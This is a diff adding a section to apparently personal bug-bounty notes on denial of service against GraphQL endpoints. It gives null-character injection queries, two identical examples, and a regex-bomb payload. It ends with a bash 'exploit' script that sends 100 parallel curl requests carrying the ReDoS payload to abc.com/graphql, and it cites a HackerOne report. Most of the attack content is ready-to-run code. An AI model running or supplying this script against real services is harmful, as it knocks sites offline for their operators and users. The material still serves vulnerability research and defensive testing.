@@ -80,5 +80,58 @@ gospider -a -s abc.com -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https:
 /_layouts/mobile/view.aspx
 Google dork: /_layouts/mobile/view.aspx
 ```
+## DOS GraphQl Endpoint
+*** Create DOS on GraphQl Endpoint by appending null characters by somehow
+You can reveal the bug inserting `"\u0000"` on search parameter, in order to display an error with part of the graph query.
+** Example -1**
+```json
+query a { 
+  search(q: "\u0000)", lang: "en") {
+    _id
+   weapon_id
+    rarity
+    collection{ _id name }
+    collection_id  
+ }
+}
+```
+** Example -2 
+```json
+query a { 
+  search(q: "\u0000)", lang: "en") {
+    _id
+   weapon_id
+    rarity
+    collection{ _id name }
+    collection_id  
+ }
+}
+```
+### Graphql Payload with Regex Bomb
+```json
+query a { 
+  search(q: "[a-zA-Z0-9]+\\s?)+$|^([a-zA-Z0-9.'\\w\\W]+\\s?)+$\\", lang: "en") {
+    _id
+   weapon_id
+    rarity
+    collection{ _id name }
+    collection_id 
+ }
+}
+```
+### Exploit Code
+```sh
+#!/bin/bash
+RED='\033[0;31m'
+Y='\033[0;33m'
+NC='\033[0m' # No Color
+printf  "${Y}================================================================\n"
+printf  "${Y}====================${NC} EXECUTING THE PAYLOAD ON ${Y}=======================\n"
+printf  "${NC}https://abc.com/graphql ${Y}========\n"
+printf  "${Y}================================================================${NC}\n"
+for i in {1..100}; do curl 'https://abc.com/graphql'  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' -H 'content-type: application/json' -H 'accept: */*'      --data-binary $'{"query":"query a { \\n  search(q: \\"[a-zA-Z0-9]+\\\\\\\\s?)+$|^([a-zA-Z0-9.\'\\\\\\\\w\\\\\\\\W]+\\\\\\\\s?)+$\\\\\\\\\\", lang: \\"en\\") {\\n    _id\\n   weapon_id\\n    rarity\\n    collection{ _id name }\\n    collection_id \\n \\n }\\n}","variables":null}' --compressed  & done
 
+```
+### Supporting Materials
+> ***https://hackerone.com/reports/1000567***
 
